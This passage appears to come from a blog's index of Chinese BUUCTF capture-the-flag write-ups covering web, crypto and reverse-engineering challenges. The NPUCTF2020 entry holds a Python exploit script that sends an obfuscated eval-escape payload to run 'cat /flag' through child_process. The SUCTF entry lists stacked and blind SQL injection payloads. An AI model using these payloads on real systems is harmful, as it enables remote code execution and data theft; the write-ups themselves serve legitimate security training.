class=\"number\">87</span>;</span><br><span class=\"line\">        ++v8;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">while</span> (a1);</span><br><span class=\"line\">    *v8 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    v9 = v8 - <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">do</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        v5 = *v9;</span><br><span class=\"line\">        *v9 = *v7;</span><br><span class=\"line\">        *v7 = v5;</span><br><span class=\"line\">        --v9;</span><br><span class=\"line\">        result = ++v7;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">while</span> (v7 &lt; v9);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>好了，结案了，<code>atoi</code>函数是现有的，麻了。。</p>\n<p>简单的逻辑就是把输入的<code>Srring</code>转换为整型数，然后+1储存到<code>Value</code>，所以输入的<code>String</code>是<code>122</code>，并且<code>String[3:5]</code>=”xyz”，所以密码是“122xyz”</p>\n<p><img src=\"/images/Writeup/image-20210922234823010.png\" alt=\"image-20210922234823010\"></p>\n<p>flag:<del>flag{123_Buff3r_0v3rf|0w}</del></p>\n","categories":["Reserve","Misc"]},{"title":"NPUCTF2020-验证🐎","url":"/2021/08/31/NPUCTF2020-%E9%AA%8C%E8%AF%81%F0%9F%90%8E/","content":"<p><a href=\"https://buuoj.cn/challenges#[NPUCTF2020]%E9%AA%8C%E8%AF%81%F0%9F%90%8E\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>我分配到的主机是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://a32c061e-032b-4338-9466-7c9b789fb397.node4.buuoj.cn:81/</span><br></pre></td></tr></table></figure>\n<p>看样子，里面应该是一套验证算法：<br><img src=\"/images/Writeup/20210831065040.png\"><br>F12看了一下源码，没发现切入口，但是点击最上面的按钮会出来判断结构的代码：<br><img src=\"/images/Writeup/20210831065142.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> express = <span class=\"keyword\">require</span>(<span class=\"string\">&#x27;express&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> bodyParser = <span class=\"keyword\">require</span>(<span class=\"string\">&#x27;body-parser&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> cookieSession = <span class=\"keyword\">require</span>(<span class=\"string\">&#x27;cookie-session&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> fs = <span class=\"keyword\">require</span>(<span class=\"string\">&#x27;fs&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> crypto = <span class=\"keyword\">require</span>(<span class=\"string\">&#x27;crypto&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> keys = <span class=\"keyword\">require</span>(<span class=\"string\">&#x27;./key.js&#x27;</span>).keys;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">md5</span>(<span class=\"params\">s</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> crypto.createHash(<span class=\"string\">&#x27;md5&#x27;</span>)</span><br><span class=\"line\">    .update(s)</span><br><span class=\"line\">    .digest(<span class=\"string\">&#x27;hex&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">saferEval</span>(<span class=\"params\">str</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&amp;|^%&lt;&gt;=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, <span class=\"string\">&#x27;&#x27;</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">eval</span>(str);</span><br><span class=\"line\">&#125; <span class=\"comment\">// 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> template = fs.readFileSync(<span class=\"string\">&#x27;./index.html&#x27;</span>).toString();</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span>(<span class=\"params\">results</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> template.replace(<span class=\"string\">&#x27;&#123;&#123;results&#125;&#125;&#x27;</span>, results.join(<span class=\"string\">&#x27;&lt;br/&gt;&#x27;</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> app = express();</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"keyword\">use</span>(bodyParser.urlencoded(&#123; extended: <span class=\"literal\">false</span> &#125;));</span><br><span class=\"line\">app.<span class=\"keyword\">use</span>(bodyParser.json());</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"keyword\">use</span>(cookieSession(&#123;</span><br><span class=\"line\">  name: <span class=\"string\">&#x27;PHPSESSION&#x27;</span>, <span class=\"comment\">// 2020.3/WORKER2 嘿嘿，给👴爪⑧</span></span><br><span class=\"line\">  keys</span><br><span class=\"line\">&#125;));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">Object</span>.freeze(<span class=\"keyword\">Object</span>);</span><br><span class=\"line\"><span class=\"keyword\">Object</span>.freeze(Math);</span><br><span class=\"line\"></span><br><span class=\"line\">app.post(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">  let result = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> results = req.session.results || [];</span><br><span class=\"line\">  <span class=\"keyword\">const</span> &#123; e, first, second &#125; = req.body;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class=\"number\">0</span>]) === md5(second+keys[<span class=\"number\">0</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (req.body.e) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        result = saferEval(req.body.e) || <span class=\"string\">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">        console.log(e);</span><br><span class=\"line\">        result = <span class=\"string\">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      results.unshift(`$&#123;req.body.e&#125;=$&#123;result&#125;`);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    results.unshift(<span class=\"string\">&#x27;Not verified!&#x27;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (results.length &gt; <span class=\"number\">13</span>) &#123;</span><br><span class=\"line\">    results.pop();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  req.session.results = results;</span><br><span class=\"line\">  res.send(render(req.session.results));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span></span><br><span class=\"line\">app.get(<span class=\"string\">&#x27;/source&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">  res.set(<span class=\"string\">&#x27;Content-Type&#x27;</span>, <span class=\"string\">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class=\"line\">  res.send(fs.readFileSync(<span class=\"string\">&#x27;./index.js&#x27;</span>));</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.get(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">  res.set(<span class=\"string\">&#x27;Content-Type&#x27;</span>, <span class=\"string\">&#x27;text/html;charset=utf-8&#x27;</span>);</span><br><span class=\"line\">  req.session.admin = req.session.admin || <span class=\"number\">0</span>;</span><br><span class=\"line\">  res.send(render(req.session.results = req.session.results || []))</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.listen(<span class=\"number\">80</span>, <span class=\"string\">&#x27;0.0.0.0&#x27;</span>, () =&gt; &#123;</span><br><span class=\"line\">  console.log(<span class=\"string\">&#x27;Start listening&#x27;</span>)</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>其实就是代码审计的题，但是仍然看不懂。。<br>总之，构建脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;Content-Type&quot;</span>:<span class=\"string\">&quot;application/json&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">url = <span class=\"string\">&quot;http://14b5ae3b-e444-4e5b-9e2b-1ba3100fc085.node3.buuoj.cn/&quot;</span></span><br><span class=\"line\">data = &#123;<span class=\"string\">&quot;e&quot;</span>:<span class=\"string\">&#x27;(Math=&gt;(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)&#x27;</span>,<span class=\"string\">&quot;first&quot;</span>:[<span class=\"number\">0</span>],<span class=\"string\">&quot;second&quot;</span>:<span class=\"string\">&quot;0&quot;</span>&#125;</span><br><span class=\"line\">r = requests.post(url,data=json.dumps(data),headers=headers)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.text)</span><br></pre></td></tr></table></figure>\n<p>flag:<del>flag{745e5b8f-0f2a-43a7-a101-0a89e58d94ac}</del></p>\n<hr>\n<p>参考：<br>1.<a href=\"https://blog.csdn.net/rfrder/article/details/115406785\">[NPUCTF2020]验证码</a><br>2.<a href=\"https://www.plasf.cn/articles/d5efc80b37.html\">NPUCTF2020 验证🐎-（弱类型比较、hash绕过、构造函数执行任意代码）</a></p>\n","categories":["Web","PHP代码审计"]},{"title":"Quoted-printable","url":"/2021/08/26/Quoted-printable/","content":"<p><a href=\"https://buuoj.cn/challenges#Quoted-printable\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>密文：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">=E9=82=A3=E4=BD=A0=E4=B9=9F=E5=BE=88=E6=A3=92=E5=93=A6</span><br></pre></td></tr></table></figure>\n<p>在线转换一下<a href=\"http://www.mxcz.net/tools/quotedprintable.aspx\">在线工具</a><br>flag:<del>flag{那你也很棒哦}</del></p>\n","categories":["Crypto","MIME"]},{"title":"SUCTF 2019-EasySQL","url":"/2021/08/30/SUCTF%202019-EasySQL/","content":"<p><a href=\"https://buuoj.cn/challenges#[SUCTF%202019]EasySQL\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>我分配到的主机是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://aea8fc94-47fa-4f23-8da2-e366fc025d28.node4.buuoj.cn:81/</span><br></pre></td></tr></table></figure>\n<p>打开链接：<br><img src=\"/images/Writeup/20210830085257.png\"><br>试了一下常规的注入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1&#x27;</span><br></pre></td></tr></table></figure>\n<p>order查询</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1 order by 2#</span><br></pre></td></tr></table></figure>\n<p>报错注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1 and length(database())&gt;=1#</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1&#x27; and length(database())&gt;=1#</span><br></pre></td></tr></table></figure>\n<p>时间盲注：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1 and if(length(database())&gt;=1,1,sleep(5))#</span><br></pre></td></tr></table></figure>\n<p>以上都失效了，怀疑是存在关键词排除。。堆叠注入倒是成功了：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>;<span class=\"keyword\">show</span> databases#</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Array ( [0] =&gt; 1 ) Array ( [0] =&gt; ctf ) Array ( [0] =&gt; ctftraining ) Array ( [0] =&gt; information_schema ) Array ( [0] =&gt; mysql ) Array ( [0] =&gt; performance_schema ) Array ( [0] =&gt; test )</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>;<span class=\"keyword\">show</span> tables#</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag )</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>这道题目需要我们去对后端语句进行猜测<br>1、输入非零数字得到的回显1和输入其余字符得不到回显=&gt;来判断出内部的查询语句可能存在有||<br>2、也就是select 输入的数据||内置的一个列名 from 表名=&gt;即为</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"operator\">&gt;</span><span class=\"keyword\">select</span> post进去的数据<span class=\"operator\">||</span>flag <span class=\"keyword\">from</span> Flag(含有数据的表名，通过堆叠注入可知)</span><br></pre></td></tr></table></figure>\n<p>此时的||起到的作用是or的作用<br>解法1<br>内置的sql语句为</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"operator\">&gt;</span><span class=\"keyword\">sql</span><span class=\"operator\">=</span>“<span class=\"keyword\">select</span>”.post[‘query’].&quot;||flag from Flag&quot;;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;1</span><br></pre></td></tr></table></figure>\n<p>如果$post[‘query’]的数据为*,1，sql语句就变成了</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"operator\">&gt;</span><span class=\"keyword\">select</span> <span class=\"operator\">*</span>,<span class=\"number\">1</span><span class=\"operator\">||</span>flag <span class=\"keyword\">from</span> Flag</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1</span><br></pre></td></tr></table></figure>\n<p>也就是</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"operator\">&gt;</span><span class=\"keyword\">select</span> <span class=\"operator\">*</span>,<span class=\"number\">1</span> <span class=\"keyword\">from</span> Flag</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1</span><br></pre></td></tr></table></figure>\n<p>也就是直接查询出了Flag表中的所有内容<br>————————————————<br>版权声明：本文为CSDN博主「一只小白来了」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href=\"https://blog.csdn.net/weixin_44866139/article/details/105857487\">https://blog.csdn.net/weixin_44866139/article/details/105857487</a></p>\n</blockquote>\n<p>也就是构建payload：*，1<br><img src=\"/images/Writeup/20210830091034.png\"><br>flag:~~flag{83b62b69-02c1-4776-8996-7d431a7f3ce6}~~~</p>\n","categories":["Web","SQL注入"]},{"title":"SimpleRev","url":"/2021/08/27/SimpleRev/","content":"<p><a href=\"https://buuoj.cn/challenges#SimpleRev\">题目链接</a><br>附件下载得到程序，进IDA看一下：<br><img src=\"/images/Writeup/20210827130340.png\"><br>F5逆向看一下：<br><img src=\"/images/Writeup/20210827130409.png\"><br>转换一下ASCII值：<br><img src=\"/images/Writeup/20210827130428.png\"><br>找到核心函数–&gt;Decry：<br><img src=\"/images/Writeup/20210827130519.png\"><br>看一下Decry的核心逻辑：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Please input your flag:&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    v1 = getchar();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (v1 == <span class=\"number\">10</span>)</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (v1 == <span class=\"number\">32</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ++v2;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (v1 &lt;= <span class=\"number\">96</span> || v1 &gt; <span class=\"number\">122</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (v1 &gt; <span class=\"number\">64</span> &amp;&amp; v1 &lt;= <span class=\"number\">90</span>)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                str2[v2] = (v1 - <span class=\"number\">39</span> - key[v3 % v5] + <span class=\"number\">97</span>) % <span class=\"number\">26</span> + <span class=\"number\">97</span>;</span><br><span class=\"line\">                ++v3;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            str2[v2] = (v1 - <span class=\"number\">39</span> - key[v3 % v5] + <span class=\"number\">97</span>) % <span class=\"number\">26</span> + <span class=\"number\">97</span>;</span><br><span class=\"line\">            ++v3;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!(v3 % v5))</span><br><span class=\"line\">            <span class=\"built_in\">putchar</span>(<span class=\"number\">32</span>);</span><br><span class=\"line\">        ++v2;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"built_in\">strcmp</span>(text, str2))</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Congratulation!\\n&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Try again!\\n&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v11;</span><br></pre></td></tr></table></figure>\n<p>上脚本运算一下：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;bits/stdc++.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> key[] = <span class=\"string\">&quot;ADSFKNDCLS&quot;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> text[] = <span class=\"string\">&quot;killshadow&quot;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> a;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> <span class=\"keyword\">final</span>[<span class=\"number\">10</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i, v5;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> v3 = <span class=\"number\">0</span>, v2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tv5 = <span class=\"built_in\">strlen</span>(key);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; v5; ++i)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (key[v3 % v5] &gt; <span class=\"number\">64</span> &amp;&amp; key[v3 % v5] &lt;= <span class=\"number\">90</span>)</span><br><span class=\"line\">\t\t\tkey[i] = key[v3 % v5] + <span class=\"number\">32</span>;</span><br><span class=\"line\">\t\t++v3;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tstd::cout &lt;&lt; key &lt;&lt; <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>;i &lt; <span class=\"number\">5</span>;i++)<span class=\"comment\">//放大取模倍数</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tv3 = <span class=\"number\">10</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (v2 = <span class=\"number\">0</span>;v2 &lt; <span class=\"number\">10</span>;v2++)<span class=\"comment\">//十个字符</span></span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\ta = text[v2] - <span class=\"number\">97</span> + i * <span class=\"number\">26</span> - <span class=\"number\">97</span> + key[v3++ % v5] + <span class=\"number\">39</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (a &gt;= <span class=\"number\">65</span> &amp;&amp; a &lt;= <span class=\"number\">90</span>)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">final</span>[v2] = a;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tstd::cout &lt;&lt; <span class=\"keyword\">final</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>得到输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">adsfkndcls</span><br><span class=\"line\">KLDQCUDFZOkillshadow</span><br></pre></td></tr></table></figure>\n<p>取有效数据，得到flag。<br>flag:<del>flag{KLDQCUDFZO}</del></p>\n<hr>\n<p>参考：<br>1.<a href=\"https://blog.csdn.net/qq_45711410/article/details/108009289\">[BUUCTF]RE-SimpleRev</a></p>\n","categories":["Reserve"]},{"title":"UTCTF2020-basic-re","url":"/2021/09/11/UTCTF2020-basic-re/","content":"<p><a href=\"https://buuoj.cn/challenges#[UTCTF2020]basic-re\">题目链接</a><br>附件下载，是一个ELF文件：<br><img src=\"/images/Writeup/20210911232046.png\"><br>翻一下结构，就发现了flag：<br><img src=\"/images/Writeup/20210911233246.png\"><br>flag:<del>utflag{str1ngs_1s_y0ur_fr13nd}</del></p>\n","categories":["Reserve"]},{"title":"Unencode","url":"/2021/08/26/Unencode/","content":"<p><a href=\"https://buuoj.cn/challenges#Unencode\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>附件下载，得到密文：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">89FQA9WMD&lt;V1A&lt;V1S83DY.#&lt;W3$Q,2TM]</span><br></pre></td></tr></table></figure>\n<p>直接<a href=\"http://ctf.ssleye.com/uu.html\">CTF在线工具</a>解码。<br>flag:<del>flag{dsdasdsa99877LLLKK}</del></p>\n","categories":["Crypto","摩斯密码","ASCII"]},{"title":"WUSTCTF2020-level1","url":"/2021/08/26/WUSTCTF2020-level1/","content":"<p><a href=\"https://buuoj.cn/challenges#[WUSTCTF2020]level1\">题目链接</a><br>拖进IDA分析一下：<br><img src=\"/images/Writeup/20210826150651.png\"><br>F5逆向一下源代码，看一下结构：<br>可以得到核心代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">stream = fopen(<span class=\"string\">&quot;flag&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">fread(ptr, <span class=\"number\">1uLL</span>, <span class=\"number\">0x14</span>uLL, stream);</span><br><span class=\"line\">fclose(stream);</span><br><span class=\"line\"><span class=\"keyword\">for</span> ( i = <span class=\"number\">1</span>; i &lt;= <span class=\"number\">19</span>; ++i )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ( (i &amp; <span class=\"number\">1</span>) != <span class=\"number\">0</span> )</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%ld\\n&quot;</span>, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)(ptr[i] &lt;&lt; i));</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%ld\\n&quot;</span>, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)(i * ptr[i]));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br></pre></td></tr></table></figure>\n<p>依照源代码和附件里面的output.txt文件，逆向写一个解密脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\">i:<span class=\"built_in\">int</span>=<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;output.txt&quot;</span>,<span class=\"string\">&quot;r&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> f:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i%<span class=\"number\">2</span> :</span><br><span class=\"line\">            a=<span class=\"built_in\">int</span>(line)&gt;&gt;i</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            a=<span class=\"built_in\">int</span>(line)//i</span><br><span class=\"line\">        i+=<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(a),end=<span class=\"string\">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>\n<p>运行代码，便可以得到最终的flag。<br>flag:<del>ctf2020{d9-dE6-20c}</del><br><em>记得改flag格式</em></p>\n","categories":["Reserve"]},{"title":"WUSTCTF2020-level2","url":"/2021/09/04/WUSTCTF2020-level2/","content":"<p><a href=\"https://buuoj.cn/challenges#[WUSTCTF2020]level2\">题目链接</a><br>附件下载得到程序，看一下信息：<br><img src=\"/images/Writeup/20210904141401.png\"><br>upx脱壳一下：</p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">D:\\<span class=\"title\">Downloads</span>&gt;<span class=\"title\">upx</span> -<span class=\"title\">d</span>  <span class=\"title\">attachment</span></span></span><br><span class=\"line\"><span class=\"function\">                       <span class=\"title\">Ultimate</span> <span class=\"title\">Packer</span> <span class=\"title\">for</span> <span class=\"title\">eXecutables</span></span></span><br><span class=\"line\"><span class=\"function\">                          <span class=\"title\">Copyright</span> (<span class=\"title\">C</span>) 1996 - 2020</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">UPX</span> 3.96<span class=\"title\">w</span>       <span class=\"title\">Markus</span> <span class=\"title\">Oberhumer</span>, <span class=\"title\">Laszlo</span> <span class=\"title\">Molnar</span> &amp; <span class=\"title\">John</span> <span class=\"title\">Reiser</span>   <span class=\"title\">Jan</span> 23<span class=\"title\">rd</span> 2020</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">        <span class=\"title\">File</span> <span class=\"title\">size</span>         <span class=\"title\">Ratio</span>      <span class=\"title\">Format</span>      <span class=\"title\">Name</span></span></span><br><span class=\"line\"><span class=\"function\">   --------------------   ------   -----------   -----------</span></span><br><span class=\"line\"><span class=\"function\">    725344 &lt;-    293476   40.46%   <span class=\"title\">linux</span>/<span class=\"title\">i386</span>    <span class=\"title\">attachment</span></span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">Unpacked</span> 1 <span class=\"title\">file</span>.</span></span><br></pre></td></tr></table></figure>\n<p>然后拖进IDA看一下主函数：<br><img src=\"/images/Writeup/20210904141547.png\"><br>这不就看到flag了。。<br>flag:<del>wctf2020{Just_upx_-d}</del><br><em>确实，flag里面也说了，只要upx脱壳一下就好了</em></p>\n","categories":["Reserve","UPX"]},{"title":"bjdctf_2020_babystack","url":"/2021/09/13/bjdctf_2020_babystack/","content":"<p><a href=\"https://buuoj.cn/challenges#bjdctf_2020_babystack\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>先看一下保护信息：<br><img src=\"/images/Writeup/20210913131053.png\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">randark@randark-VirtualBox:~/shared$ checksec 